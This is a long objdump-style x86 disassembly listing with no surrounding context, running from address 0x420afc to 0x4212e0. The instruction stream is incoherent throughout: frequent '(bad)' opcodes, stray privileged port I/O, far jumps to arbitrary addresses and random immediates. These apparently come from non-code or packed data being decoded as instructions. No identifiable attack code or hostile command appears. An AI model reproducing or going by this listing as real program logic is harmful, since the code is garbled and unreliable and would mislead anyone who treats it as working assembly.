  420afc:	and    DWORD PTR [eax+0x53],0x35
  420b00:	inc    ecx
  420b01:	sbb    DWORD PTR [ebx],eax
  420b03:	xor    BYTE PTR [eax-0x1c016d30],0xbc
  420b0a:	stc    
  420b0b:	dec    ecx
  420b0c:	sub    edx,DWORD PTR [ecx-0x2455393c]
  420b12:	lock cmp al,0x6f
  420b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b16:	dec    ecx
  420b17:	push   0x3f
  420b19:	popf   
  420b1a:	push   ss
  420b1b:	(bad)  
  420b1c:	fild   DWORD PTR ds:0x19235cf7
  420b22:	int    0xec
  420b24:	outs   dx,BYTE PTR ds:[esi]
  420b25:	and    al,0xdb
  420b27:	mov    ebx,0x1e729958
  420b2c:	mov    eax,0xdacfded
  420b31:	bound  ecx,QWORD PTR [ecx+0x22e5c41b]
  420b37:	(bad)  
  420b38:	mov    ebp,0x7c97d595
  420b3d:	dec    esi
  420b3e:	xor    ch,al
  420b40:	dec    esi
  420b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b42:	jmp    0x2ef104ad
  420b47:	push   ebx
  420b48:	add    eax,0x61eda90
  420b4d:	cmp    ebx,eax
  420b4f:	pushf  
  420b50:	ss cmp al,0xd3
  420b53:	cs jns 0x420b10
  420b56:	push   ds
  420b57:	stos   DWORD PTR es:[edi],eax
  420b58:	dec    edx
  420b59:	in     al,dx
  420b5a:	inc    eax
  420b5b:	shl    DWORD PTR [ebx+0x6b],cl
  420b5e:	dec    ecx
  420b5f:	adc    DWORD PTR [esi],eax
  420b61:	pop    edx
  420b62:	mov    eax,ds:0x49eab335
  420b67:	push   ebx
  420b68:	test   BYTE PTR [ecx+0x11675e83],al
  420b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b6f:	and    al,0x12
  420b71:	mov    cl,0xa4
  420b73:	jae    0x420be6
  420b75:	loopne 0x420b82
  420b77:	fwait
  420b78:	(bad)  
  420b79:	and    cl,BYTE PTR [ebx+0x48f9608]
  420b7f:	loopne 0x420b65
  420b81:	stos   BYTE PTR es:[edi],al
  420b82:	test   DWORD PTR [eax-0x443aa8ec],esi
  420b88:	leave  
  420b89:	imul   ebp,DWORD PTR ds:0x2c2391eb,0xffffffad
  420b90:	jecxz  0x420bf2
  420b92:	xchg   BYTE PTR [ecx],ah
  420b94:	fst    QWORD PTR [edx+0x73]
  420b97:	pop    es
  420b98:	xchg   edi,eax
  420b99:	xlat   BYTE PTR ds:[ebx]
  420b9a:	push   esi
  420b9b:	fdiv   DWORD PTR [edx-0x25]
  420b9e:	rol    DWORD PTR [ebx+0x48f929d5],cl
  420ba4:	xchg   edx,eax
  420ba5:	fdivr  DWORD PTR [ecx]
  420ba7:	arpl   bx,dx
  420ba9:	aaa    
  420baa:	mov    esi,cs
  420bac:	cli    
  420bad:	adc    al,0x6a
  420baf:	pop    edx
  420bb0:	push   eax
  420bb1:	out    0xe0,eax
  420bb3:	mov    ebp,0xaad567bc
  420bb8:	popf   
  420bb9:	xchg   ebx,eax
  420bba:	inc    ebx
  420bbb:	mov    ebp,0xdff3ec03
  420bc0:	popa   
  420bc1:	stos   DWORD PTR es:[edi],eax
  420bc2:	lods   al,BYTE PTR ds:[esi]
  420bc3:	xor    eax,0x27d4bb7f
  420bc8:	add    bl,BYTE PTR [edi-0x7b507e05]
  420bce:	inc    edi
  420bcf:	inc    ebp
  420bd0:	mov    ebx,0x396adcb0
  420bd5:	(bad)  
  420bd6:	fmul   DWORD PTR [edi-0x72]
  420bd9:	add    BYTE PTR [edx+0x75],bl
  420bdc:	sar    DWORD PTR [ebx+0x69efb0b1],cl
  420be2:	mov    bl,0x60
  420be4:	add    DWORD PTR [ecx+0x15],ecx
  420be7:	ror    BYTE PTR [ecx+ecx*4],cl
  420bea:	fbstp  TBYTE PTR [ebx]
  420bec:	fwait
  420bed:	mov    ecx,0x23b0b546
  420bf2:	mov    bl,0xef
  420bf4:	dec    esp
  420bf5:	lea    edi,[ecx-0x6452453a]
  420bfb:	jae    0x420b97
  420bfd:	retf   0xf451
  420c00:	adc    al,0x62
  420c02:	ror    BYTE PTR [ecx+ebp*2-0x1e],0x64
  420c07:	repnz loopne 0x420c28
  420c0a:	pop    esp
  420c0b:	pop    ebp
  420c0c:	mov    bl,0xe0
  420c0e:	test   eax,0xae2babe4
  420c13:	bound  ecx,QWORD PTR [ebx+0x7c665f88]
  420c19:	mov    al,ds:0x0
	...
  420c26:	add    BYTE PTR [edx+0x6c],dl
  420c29:	jle    0x420c21
  420c2b:	jle    0x420c23
  420c2d:	(bad)  
  420c2f:	mov    dl,0x13
  420c31:	lock push ebx
  420c33:	popf   
  420c34:	(bad)
  420c37:	mov    bl,0x88
  420c39:	add    DWORD PTR [eax],eax
  420c3b:	sub    eax,DWORD PTR [edx]
  420c3d:	add    BYTE PTR [eax],al
  420c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c40:	icebp  
  420c41:	out    0xcc,al
  420c43:	inc    eax
  420c44:	repz jno 0x420c16
  420c47:	into   
  420c48:	in     al,0x22
  420c4a:	gs iret 
  420c4c:	jle    0x420bf2
  420c4e:	push   0xffffffc7
  420c50:	mov    bl,0xe7
  420c52:	pop    esp
  420c53:	fwait
  420c54:	ret    
  420c55:	push   eax
  420c56:	out    dx,eax
  420c57:	and    edi,DWORD PTR [ecx+0x496a6ec6]
  420c5d:	and    eax,0xd4654086
  420c62:	sub    DWORD PTR cs:[edx-0x33],esp
  420c66:	sub    edi,DWORD PTR [esi-0x5821187]
  420c6c:	(bad)  
  420c6e:	push   ecx
  420c6f:	leave  
  420c70:	fsubr  st(6),st
  420c72:	repnz rol BYTE PTR [esi+ebp*4+0x6a39f1c7],cl
  420c7a:	pushf  
  420c7b:	xor    edi,ebx
  420c7d:	jle    0x420cbe
  420c7f:	test   DWORD PTR [ebx+0x589191a0],edx
  420c85:	adc    dl,BYTE PTR [eax+0x5e]
  420c88:	adc    al,0xf5
  420c8a:	add    dl,BYTE PTR [esi-0x51]
  420c8d:	xchg   ebp,eax
  420c8e:	cld    
  420c8f:	xchg   bl,dl
  420c91:	jae    0x420cfe
  420c93:	cwde   
  420c94:	sub    BYTE PTR [eax+0x1],dl
  420c97:	and    DWORD PTR [eax-0x5],0xb8bf6808
  420c9e:	sbb    eax,0x6208be4f
  420ca3:	imul   esi,DWORD PTR ds:0xf97da91,0x38ab9a52
  420cad:	ss aas 
  420caf:	pop    esp
  420cb0:	aam    0xe3
  420cb2:	push   edx
  420cb3:	leave  
  420cb4:	sub    BYTE PTR [edx+0x60],0xe7
  420cb8:	inc    esi
  420cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cba:	pusha  
  420cbb:	xor    DWORD PTR [ebx+edi*2-0x6190433e],ebx
  420cc2:	mov    ds:0xaf590aa8,al
  420cc7:	call   DWORD PTR [esi]
  420cc9:	sbb    esi,DWORD PTR [ebx+0x5c746fd6]
  420ccf:	stc    
  420cd0:	movd   mm4,DWORD PTR [ebp-0x4513c1c3]
  420cd7:	xchg   edx,eax
  420cd8:	retf   0x8f67
  420cdb:	shl    DWORD PTR [ebx],cl
  420cdd:	xor    BYTE PTR [ebp+eiz*4-0x7],0x4
  420ce2:	int    0x1d
  420ce4:	pop    ecx
  420ce5:	mov    ecx,ecx
  420ce7:	mov    ecx,0xf5036714
  420cec:	dec    ebp
  420ced:	jb     0x420d24
  420cef:	mov    edi,0x7324f3dd
  420cf4:	clc    
  420cf5:	mov    eax,0xb4ed7b6a
  420cfa:	sub    eax,0x85a437b
  420cff:	jle    0x420cd5
  420d01:	sbb    edx,ebp
  420d03:	cmp    ch,dl
  420d05:	push   0x36
  420d07:	aad    0xde
  420d09:	mov    ds:0xf2770176,eax
  420d0e:	and    eax,0x75d7250b
  420d13:	add    al,0x6d
  420d15:	xlat   BYTE PTR ds:[ebx]
  420d16:	cmp    eax,0x88f3d244
  420d1b:	jno    0x420cf5
  420d1d:	jmp    0x35724550
  420d22:	lahf   
  420d23:	push   edx
  420d24:	(bad)  
  420d25:	push   0x5e
  420d27:	jp     0x420d42
  420d29:	xchg   ebx,eax
  420d2a:	imul   esp,DWORD PTR [ebp-0x7c],0xffffffec
  420d2e:	push   cs
  420d2f:	mov    dl,0x63
  420d31:	and    cl,BYTE PTR [edx]
  420d33:	cli    
  420d34:	test   dl,0xb9
  420d37:	push   es
  420d38:	jmp    0x420d01
  420d3a:	sub    al,0xec
  420d3c:	mov    ebx,0x77b033e5
  420d41:	sbb    ecx,ebx
  420d43:	push   esi
  420d44:	repz lahf 
  420d46:	cmp    BYTE PTR [ecx+0x5e8f49d1],dh
  420d4c:	push   eax
  420d4d:	retf   0xfcf
  420d50:	inc    ebp
  420d51:	ficomp WORD PTR [edx+ebx*4]
  420d54:	xchg   edx,eax
  420d55:	xchg   edx,eax
  420d56:	out    dx,al
  420d57:	in     al,dx
  420d58:	xchg   DWORD PTR [edx-0x47],ebp
  420d5b:	mov    eax,0xed7b44f0
  420d60:	mov    eax,0x8fb8c370
  420d65:	fild   WORD PTR [ebx]
  420d67:	int    0x23
  420d69:	enter  0xcb55,0xa6
  420d6d:	mov    esi,0xdb868c11
  420d72:	pop    eax
  420d73:	mov    ebp,gs
  420d75:	pop    esi
  420d76:	xchg   esi,eax
  420d77:	sbb    ebx,DWORD PTR [edx-0x693ff349]
  420d7d:	(bad)  
  420d7f:	jge    0x420d8e
  420d81:	bound  esi,QWORD PTR [edi+0x747e6e47]
  420d87:	mov    esp,0xa535203b
  420d8c:	or     bl,al
  420d8e:	out    0xcc,al
  420d90:	sbb    eax,0x194287e3
  420d95:	enter  0xb2a9,0x34
  420d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d9a:	shl    cl,0x8d
  420d9d:	sbb    eax,0x9205fa8d
  420da2:	out    dx,eax
  420da3:	test   DWORD PTR [ebx],ebx
  420da5:	push   ds
  420da6:	jmp    0x839b3c17
  420dab:	nop
  420dac:	push   esi
  420dad:	loopne 0x420d84
  420daf:	(bad)  
  420db0:	or     dl,BYTE PTR [ebp+0x37]
  420db3:	out    0x94,al
  420db5:	mov    esi,0x81eb217f
  420dba:	retf   
  420dbb:	dec    ecx
  420dbc:	popa   
  420dbd:	dec    esi
  420dbe:	je     0x420def
  420dc0:	or     eax,0x49f19bdb
  420dc5:	sbb    edx,DWORD PTR [ecx]
  420dc7:	out    dx,al
  420dc8:	push   ebp
  420dc9:	out    0x86,eax
  420dcb:	cmp    BYTE PTR [eax+0x5260d8e3],al
  420dd1:	data16 cmp ah,BYTE PTR [ebp+0x48]
  420dd5:	stos   BYTE PTR es:[edi],al
  420dd6:	push   ebp
  420dd7:	fldenv [ebp+0x1d]
  420dda:	inc    edi
  420ddb:	fcomp  QWORD PTR [edi-0x4e]
  420dde:	push   esp
  420ddf:	pop    eax
  420de0:	cmp    BYTE PTR [edi],ah
  420de2:	test   DWORD PTR [edx+0xf],edx
  420de5:	icebp  
  420de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de7:	xchg   esp,eax
  420de8:	xchg   ebp,eax
  420de9:	mov    BYTE PTR [ebp+0x125caa94],dh
  420def:	cwde   
  420df0:	jge    0x420d74
  420df2:	lea    ebp,[esi+0x41]
  420df5:	adc    al,0x36
  420df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df8:	fldcw  WORD PTR [ebp+0x3732900e]
  420dfe:	loopne 0x420db0
  420e00:	cs dec edi
  420e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e03:	and    al,0x86
  420e05:	das    
  420e06:	xor    DWORD PTR [edx],ebx
  420e08:	(bad)  
  420e09:	fst    DWORD PTR [eax]
  420e0b:	enter  0x95e4,0x68
  420e0f:	mov    esp,0xc65a984a
  420e14:	mov    edx,0x42b4a210
  420e19:	ror    DWORD PTR [ebx-0x359390be],cl
  420e1f:	sbb    BYTE PTR [ebx],0xf2
  420e22:	inc    ecx
  420e23:	mov    edx,0xa236ef2
  420e28:	and    ch,ch
  420e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e2b:	and    al,0xd5
  420e2d:	sub    cl,BYTE PTR [ecx+0x252af0a7]
  420e33:	push   ds
  420e34:	pop    esi
  420e35:	js     0x420e7e
  420e37:	std    
  420e38:	loopne 0x420de7
  420e3a:	retf   
  420e3b:	repnz gs popa 
  420e3e:	mov    DWORD PTR [ebp+0x472b3876],0xb4c67def
  420e48:	jmp    0xe17ccbdc
  420e4d:	imul   esi,DWORD PTR [eax-0x1d],0x7544d699
  420e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e55:	cmp    DWORD PTR [edx-0x50993a65],eax
  420e5b:	adc    al,0x60
  420e5d:	mov    al,0x51
  420e5f:	ret    
  420e60:	xor    cl,ah
  420e62:	cmp    DWORD PTR [ebp+eax*2+0x30],eax
  420e66:	mov    cl,0x5f
  420e68:	imul   ecx,ecx,0x0
	...
  420e77:	sub    ah,BYTE PTR [edx+0x27]
  420e7a:	mov    BYTE PTR [edi-0x33],ch
  420e7d:	scas   eax,DWORD PTR es:[edi]
  420e7e:	loop   0x420eb3
  420e80:	or     eax,0x4e
  420e83:	jns    0x420ea5
  420e85:	sbb    ah,bh
  420e87:	fimul  WORD PTR [edx+0x22b0001]
  420e8d:	add    BYTE PTR [eax],al
  420e8f:	jnp    0x420e76
  420e91:	add    esi,DWORD PTR [esi-0x29]
  420e94:	xor    cl,0x67
  420e97:	xor    eax,0x2bbdc9b1
  420e9c:	test   al,0x54
  420e9e:	jg     0x420ef9
  420ea0:	test   eax,0x575d919f
  420ea5:	xchg   ebx,eax
  420ea6:	push   ds
  420ea7:	pop    ebx
  420ea8:	mov    BYTE PTR [ecx],cl
  420eaa:	sbb    BYTE PTR [esi+0x4c],ch
  420ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eae:	cwde   
  420eaf:	mov    ch,0xb0
  420eb1:	sbb    DWORD PTR [si],0x60
  420eb5:	icebp  
  420eb6:	sbb    ebx,DWORD PTR [ecx-0x7898c4e9]
  420ebc:	(bad)  
  420ebd:	lock pop ds
  420ebf:	cmp    BYTE PTR [edi],bh
  420ec1:	jp     0x420ec4
  420ec3:	mov    ah,0x80
  420ec5:	(bad)  
  420ec6:	xor    eax,0x2d3d4e42
  420ecb:	rcr    DWORD PTR [ecx+0x8],1
  420ece:	sub    eax,0xf5a68320
  420ed3:	daa    
  420ed4:	cdq    
  420ed5:	cmp    dh,al
  420ed7:	shl    BYTE PTR [edx-0x3],1
  420eda:	arpl   WORD PTR [ebp-0x50],cx
  420edd:	xchg   edi,eax
  420ede:	ret    
  420edf:	data16 scas al,BYTE PTR es:[edi]
  420ee1:	clc    
  420ee2:	push   ss
  420ee3:	push   edi
  420ee4:	je     0x420f40
  420ee6:	aad    0x96
  420ee8:	shl    BYTE PTR [edx+ebx*8-0x78dc11f6],0xe5
  420ef0:	add    ch,BYTE PTR [edi-0x26027047]
  420ef6:	pop    eax
  420ef7:	jbe    0x420efd
  420ef9:	int    0xa5
  420efb:	inc    esi
  420efc:	ror    ch,0xb6
  420eff:	mov    bh,BYTE PTR [eax-0x3bcd6e73]
  420f05:	pop    ecx
  420f06:	or     esp,DWORD PTR [edx+0x6dc40b74]
  420f0c:	mov    al,ds:0x84d8362c
  420f11:	sbb    ebx,DWORD PTR [eax+0x46b288ae]
  420f17:	out    0xe7,eax
  420f19:	sahf   
  420f1a:	cmp    al,0x8d
  420f1c:	mov    DWORD PTR [edx],eax
  420f1e:	out    0xf5,eax
  420f20:	aam    0x4b
  420f22:	aas    
  420f23:	xchg   edi,eax
  420f24:	gs dec ebp
  420f26:	daa    
  420f27:	and    BYTE PTR [esi],dh
  420f29:	lds    eax,FWORD PTR [ebx]
  420f2b:	and    DWORD PTR ds:[ebx],ebp
  420f2e:	fsubr  DWORD PTR [edi]
  420f30:	lods   al,BYTE PTR ds:[esi]
  420f31:	mov    ebx,0x39e5ca14
  420f36:	int3   
  420f37:	shl    BYTE PTR [edx+0x861e9f1],cl
  420f3d:	jno    0x420fa7
  420f3f:	in     eax,dx
  420f40:	or     ebp,DWORD PTR [ebx+0x19]
  420f43:	daa    
  420f44:	(bad)  
  420f45:	mov    WORD PTR [ebx+0x65d4fa7d],es
  420f4b:	add    bh,0x91
  420f4e:	sbb    ah,BYTE PTR [ebx+ebp*2]
  420f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f52:	rcl    DWORD PTR [edx],0xaa
  420f55:	and    BYTE PTR [eax-0x49],bh
  420f58:	push   ebx
  420f59:	xchg   ecx,eax
  420f5a:	fnop   
  420f5c:	lods   eax,DWORD PTR ds:[esi]
  420f5d:	add    eax,0x710a5ee2
  420f62:	push   edx
  420f63:	sub    DWORD PTR [eax+0x6f0e1b6c],esi
  420f69:	call   0x795d:0xa0b0d677
  420f70:	pop    esi
  420f71:	xlat   BYTE PTR ds:[ebx]
  420f72:	pop    eax
  420f73:	mov    bl,0xb7
  420f75:	sbb    esi,DWORD PTR [ebx+esi*1+0x4de97ae7]
  420f7c:	mov    ecx,0x318a1536
  420f81:	and    BYTE PTR [ebx+0x4992e48d],dl
  420f87:	jl     0x420f59
  420f89:	ret    0x619c
  420f8c:	test   BYTE PTR [eax-0x6d],cl
  420f8f:	pusha  
  420f90:	cmp    eax,0xfbea9811
  420f95:	cmp    al,0x6c
  420f97:	cmp    dl,ch
  420f99:	out    0x34,al
  420f9b:	pop    ebx
  420f9c:	pop    ss
  420f9d:	sub    al,0x21
  420f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa0:	bound  ebx,QWORD PTR ds:0xfffd0b38
  420fa6:	les    ecx,FWORD PTR [ecx-0x43]
  420fa9:	mov    al,0xe7
  420fab:	jne    0x420f9b
  420fad:	cmp    DWORD PTR [ebx+0x62],edx
  420fb0:	pusha  
  420fb1:	add    al,0x64
  420fb3:	cmc    
  420fb4:	les    eax,FWORD PTR [ebp+0x36]
  420fb7:	sbb    DWORD PTR [esi+0x25],0xffffff9f
  420fbb:	jmp    0x20741bcc
  420fc0:	imul   edx,DWORD PTR [esi-0x7de6d211],0x71f800d0
  420fca:	inc    ebx
  420fcb:	adc    eax,0x4ec814a4
  420fd0:	push   ss
  420fd1:	and    bl,dh
  420fd3:	(bad)  
  420fd4:	scas   al,BYTE PTR es:[edi]
  420fd5:	xor    DWORD PTR [ebx+0x67567348],0xfffffffb
  420fdc:	inc    esi
  420fdd:	or     al,0xd
  420fdf:	popa   
  420fe0:	add    bl,BYTE PTR es:[esi-0x5e]
  420fe4:	xlat   BYTE PTR ds:[ebx]
  420fe5:	cmc    
  420fe6:	mov    edx,es
  420fe8:	inc    eax
  420fe9:	sub    eax,0x22e96989
  420fee:	inc    ecx
  420fef:	std    
  420ff0:	pop    ecx
  420ff1:	mov    esp,esi
  420ff3:	bound  esp,QWORD PTR [esp+eiz*4+0x34]
  420ff7:	enter  0x2fbd,0xe
  420ffb:	pushf  
  420ffc:	xchg   ebp,eax
  420ffd:	and    bh,BYTE PTR [ecx]
  420fff:	hlt    
  421000:	bound  ebx,QWORD PTR [ebx]
  421002:	ins    BYTE PTR es:[edi],dx
  421003:	adc    esp,0x63651ab
  421009:	call   0xcd01e985
  42100e:	cmp    ebx,ecx
  421010:	dec    eax
  421011:	jns    0x421069
  421013:	mov    al,ds:0x17b37bb7
  421018:	inc    edi
  421019:	std    
  42101a:	adc    edi,DWORD PTR [ecx]
  42101c:	or     BYTE PTR [ebp-0x3dffde7a],ch
  421022:	ds out 0x7c,al
  421025:	mov    cl,0xf
  421027:	retf   
  421028:	pop    ss
  421029:	jbe    0x421055
  42102b:	stc    
  42102c:	enter  0x790b,0xe
  421030:	push   ecx
  421031:	ror    DWORD PTR [ebx+ebp*2-0x4],cl
  421035:	loope  0x421064
  421037:	sti    
  421038:	push   esp
  421039:	(bad)  
  42103a:	sbb    ebp,edx
  42103c:	jno    0x420fef
  42103e:	cmp    BYTE PTR [ebp+0x9],0xac
  421042:	xchg   esi,eax
  421043:	dec    esi
  421044:	dec    ebp
  421045:	fsubr  DWORD PTR [edx+0x61]
  421048:	xor    eax,0xaf5effc6
  42104d:	pop    ss
  42104e:	(bad)  
  42104f:	mov    eax,0xe9335cf1
  421054:	xor    DWORD PTR [edi+ecx*2+0x4ac4c499],edx
  42105b:	sbb    al,0xdb
  42105e:	push   0x71
  421060:	mov    es,esi
  421062:	sbb    eax,DWORD PTR [esi+eiz*1]
  421065:	loopne 0x42101a
  421067:	jg     0x42100d
  421069:	cwde   
  42106a:	inc    ebx
  42106b:	push   esi
  42106c:	mov    dh,0x63
  42106e:	mov    ch,BYTE PTR [ebx]
  421070:	pop    ebp
  421071:	and    DWORD PTR [ecx+0x71bfecc7],edi
  421077:	mov    es,WORD PTR [ebx]
  421079:	xor    DWORD PTR [eax],esi
  42107b:	jmp    0x35a0c791
  421080:	inc    esp
  421081:	(bad)  
  421082:	not    BYTE PTR [eax+0x112d98d0]
  421088:	scas   eax,DWORD PTR es:[edi]
  421089:	fadd   QWORD PTR [ebx]
  42108c:	add    DWORD PTR [ebx-0x22],0x64
  421090:	sbb    al,0x4b
  421092:	mov    bl,0x35
  421094:	sub    BYTE PTR [eax],ah
  421096:	add    ecx,ecx
  421098:	add    BYTE PTR [edx],bl
  42109a:	mov    bh,BYTE PTR [ecx+0x4c]
  42109d:	and    DWORD PTR [ecx],eax
  42109f:	cs push cs
  4210a1:	and    bh,BYTE PTR [edx-0x41]
  4210a4:	xchg   edi,eax
  4210a5:	inc    ebx
  4210a6:	pop    eax
  4210a7:	and    ah,BYTE PTR [ebx-0x77ea9d58]
  4210ad:	adc    ecx,edi
  4210af:	cmp    BYTE PTR [eax],dh
  4210b1:	ret    0xe8a5
  4210b4:	or     ebp,0x7964569d
	...
  4210c6:	add    dl,al
  4210c8:	mov    ebp,0x79ff60e4
  4210cd:	(bad)  
  4210ce:	mov    edi,0xf231f918
  4210d3:	ja     0x421058
  4210d5:	sub    al,ah
  4210d7:	or     DWORD PTR [ebp+0x22b0001],ecx
  4210dd:	add    BYTE PTR [eax],al
  4210df:	int    0xa0
  4210e1:	adc    bh,BYTE PTR [edi+0x57]
  4210e4:	je     0x4210cc
  4210e6:	test   al,0x19
  4210e8:	cdq    
  4210e9:	xchg   edx,eax
  4210ea:	test   DWORD PTR [ebx+ebp*1],0xd025f85f
  4210f1:	xchg   esp,eax
  4210f2:	imul   edx,DWORD PTR [ebx+0x7edf5590],0x168bc647
  4210fc:	inc    ebp
  4210fd:	push   0x9c560140
  421102:	bswap  eax
  421104:	sbb    BYTE PTR ss:[ebx-0x26],ah
  421108:	fild   QWORD PTR ds:0xc606c856
  42110e:	inc    edi
  42110f:	pop    edx
  421110:	stc    
  421111:	test   al,0xb3
  421113:	mov    ds:0x76ea1d1b,al
  421118:	in     al,dx
  421119:	push   ebp
  42111a:	mov    cl,0x4d
  42111c:	aas    
  42111d:	pop    eax
  42111e:	jae    0x4210d0
  421120:	clc    
  421121:	mov    bl,0x34
  421123:	icebp  
  421124:	outs   dx,DWORD PTR ds:[esi]
  421125:	push   edi
  421126:	cdq    
  421127:	test   eax,0xd33665a6
  42112c:	inc    esp
  42112d:	mov    al,0x53
  42112f:	and    eax,DWORD PTR [ebx]
  421131:	inc    edx
  421132:	dec    eax
  421133:	jbe    0x4211a5
  421135:	outs   dx,DWORD PTR ds:[esi]
  421136:	pop    ebx
  421137:	aad    0x1c
  421139:	fst    DWORD PTR [ebx]
  42113b:	add    DWORD PTR [ebp-0xd],esp
  42113e:	sub    ebx,ebp
  421140:	mov    bh,0x76
  421142:	popf   
  421143:	jg     0x4210f7
  421145:	pop    eax
  421146:	jo     0x421127
  421148:	out    dx,eax
  421149:	mov    ds:0x763afda7,al
  42114e:	outs   dx,DWORD PTR ds:[esi]
  42114f:	not    DWORD PTR [ebx]
  421151:	jns    0x421139
  421153:	stc    
  421154:	leave  
  421155:	dec    esi
  421156:	and    BYTE PTR ds:0xcde4ba7e,bh
  42115c:	inc    DWORD PTR [ebx]
  42115e:	nop
  42115f:	sub    bl,BYTE PTR [esi]
  421161:	dec    eax
  421162:	add    DWORD PTR [eax],0x2c
  421165:	mov    ebx,0xff3db84b
  42116a:	mov    bh,0x11
  42116c:	mov    ecx,0xa0c5b9e5
  421171:	xor    ch,BYTE PTR [esi-0x62c98b15]
  421177:	repnz mov ch,0xc2
  42117a:	push   0xffffffab
  42117c:	inc    ebx
  42117d:	mov    DWORD PTR [ebx+edx*4-0x142f062],edi
  421184:	in     eax,dx
  421185:	add    DWORD PTR [esi+0x53],ecx
  421188:	cmp    DWORD PTR [edx+0x4],ebp
  42118b:	xor    ah,BYTE PTR [edx-0x6dae1493]
  421191:	xor    edi,0x60
  421194:	cli    
  421195:	cmc    
  421196:	xchg   DWORD PTR [ebp-0x4c],esi
  421199:	dec    ecx
  42119a:	xchg   DWORD PTR [edx],edx
  42119c:	stos   DWORD PTR es:[edi],eax
  42119d:	push   edx
  42119f:	push   esp
  4211a0:	xchg   esp,eax
  4211a1:	(bad)  
  4211a2:	fnstenv [eax*4-0x37a91b5]
  4211a9:	and    BYTE PTR [eax+edi*1+0x10],0xf9
  4211ae:	sbb    esp,esp
  4211b0:	inc    eax
  4211b1:	cdq    
  4211b2:	jl     0x42115d
  4211b4:	ror    DWORD PTR [esp+ebx*4+0x1882a021],1
  4211bb:	mov    esp,ebx
  4211bd:	sub    al,0x2c
  4211bf:	sub    DWORD PTR [edx-0x1643e587],edi
  4211c5:	push   cs
  4211c6:	aam    0x74
  4211c8:	test   al,0xce
  4211ca:	test   ecx,ebp
  4211cc:	mul    BYTE PTR ds:0x85eacc61
  4211d2:	lahf   
  4211d3:	inc    edx
  4211d4:	push   edi
  4211d5:	fwait
  4211d6:	or     DWORD PTR ds:0x394c38d5,esp
  4211dc:	(bad)  
  4211dd:	push   edx
  4211de:	aam    0xd2
  4211e0:	xlat   BYTE PTR ds:[ebx]
  4211e1:	call   0xef7d764
  4211e6:	fwait
  4211e7:	cmp    eax,0x44e3c482
  4211ec:	rol    bl,0xbf
  4211ef:	in     al,0x81
  4211f1:	push   esp
  4211f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211f3:	pop    ebx
  4211f4:	pop    ebp
  4211f5:	shr    BYTE PTR [eax+edi*4-0x3d],1
  4211f9:	dec    edi
  4211fa:	xor    bl,ah
  4211fc:	mov    al,ds:0x3d317328
  421201:	in     al,0x4e
  421203:	mov    bh,dl
  421205:	mov    ebp,0xe5c75199
  42120a:	dec    esi
  42120b:	xor    eax,0x3e525aa5
  421210:	xchg   ebx,eax
  421211:	xchg   edx,eax
  421212:	ret    
  421213:	mov    eax,0xb98b74ee
  421218:	sub    DWORD PTR [esi+0x58],edx
  42121b:	add    al,0x4e
  42121d:	ds jge 0x4211d5
  421220:	dec    ebx
  421221:	jp     0x421283
  421223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421224:	dec    edx
  421225:	aad    0x63
  421227:	push   esp
  421228:	pop    ss
  421229:	push   ds
  42122a:	mov    esi,0x7a288c98
  42122f:	xchg   ebp,eax
  421230:	jmp    0xe129:0xb7f55a9d
  421237:	(bad)  
  421238:	mov    bh,0x8d
  42123a:	jmp    0x82b6ba22
  42123f:	xor    al,0xec
  421241:	dec    esi
  421242:	or     BYTE PTR [edx+ebx*1-0x25e81772],dh
  421249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42124a:	icebp  
  42124b:	adc    al,0xd5
  42124d:	fist   DWORD PTR [ebp-0x5c]
  421250:	inc    eax
  421251:	outs   dx,BYTE PTR ds:[esi]
  421252:	and    BYTE PTR [edx-0x28],0xa
  421256:	test   DWORD PTR [edi-0x5a82548e],eax
  42125c:	int    0x64
  42125e:	test   BYTE PTR [edx-0x1c],ch
  421261:	sbb    ecx,DWORD PTR [eax+0x519d6633]
  421267:	mov    ecx,0x763bcc67
  42126c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42126d:	sbb    BYTE PTR [ebp+0x12],bh
  421270:	mov    eax,0x59f511de
  421275:	adc    DWORD PTR [ebp-0x42569a1a],edi
  42127b:	mov    esi,0xa6e1f93e
  421280:	inc    edx
  421281:	and    cl,al
  421283:	sbb    DWORD PTR [eax],ecx
  421285:	shl    BYTE PTR [ebp-0x68d919b3],0xa3
  42128c:	xchg   ebx,eax
  42128d:	hlt    
  42128e:	xor    cl,dl
  421290:	or     eax,0xfcc05659
  421295:	push   ebx
  421296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421297:	retf   
  421298:	fidiv  DWORD PTR [esi]
  42129a:	mov    edx,0x9f4ade9c
  42129f:	(bad)  
  4212a0:	lahf   
  4212a1:	ret    
  4212a2:	enter  0x3b48,0xee
  4212a6:	jne    0x4212b4
  4212a8:	clc    
  4212a9:	into   
  4212aa:	arpl   sp,bp
  4212ac:	test   bh,bh
  4212ae:	xchg   esp,eax
  4212af:	test   DWORD PTR [edi],ecx
  4212b1:	mov    edx,0xae425bd2
  4212b6:	shl    DWORD PTR [ecx+edi*1+0x159e859b],1
  4212bd:	jbe    0x421332
  4212bf:	add    DWORD PTR [edx+edx*2-0x53564672],edx
  4212c6:	push   0x4524dea8
  4212cb:	xor    esi,0xffffffd2
  4212ce:	push   ebp
  4212cf:	imul   edx,DWORD PTR [ecx+0x1a],0x324ef183
  4212d6:	cmovno ebp,DWORD PTR [ecx+0x711f431f]
  4212dd:	mov    DWORD PTR [ecx+eiz*4],esp
  4212e0:	push   esi
